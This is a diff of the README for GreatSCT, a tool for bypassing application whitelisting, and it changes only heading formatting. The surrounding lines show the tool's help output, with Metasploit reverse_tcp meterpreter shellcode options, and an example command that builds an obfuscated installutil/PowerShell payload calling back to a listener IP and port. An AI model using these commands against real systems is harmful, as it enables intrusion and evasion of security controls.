@@ -71,7 +71,7 @@ Main menu choice:
 
 ```
 
-## Help
+**Help**
 ```# ./GreatSCT.py -h
 usage: GreatSCT.py [--update] [--version] [--list-tools] [-t Bypass] [--ip IP]
                    [--port Port] [--list-payloads]
@@ -108,7 +108,7 @@ Great Scott Options:
   --msfvenom [windows/meterpreter/reverse_tcp]
                         Metasploit shellcode to generate.
 ```
-## GreatSCT Bypass CLI
+**GreatSCT Bypass CLI**
 ```# ./GreatSCT.py --ip 192.168.157.136 --port 443 -t Bypass -p installutil/powershell/script.py -c "OBFUSCATION=ascii SCRIPT=/root/script.ps1"
 ===============================================================================
                                    Great Scott!
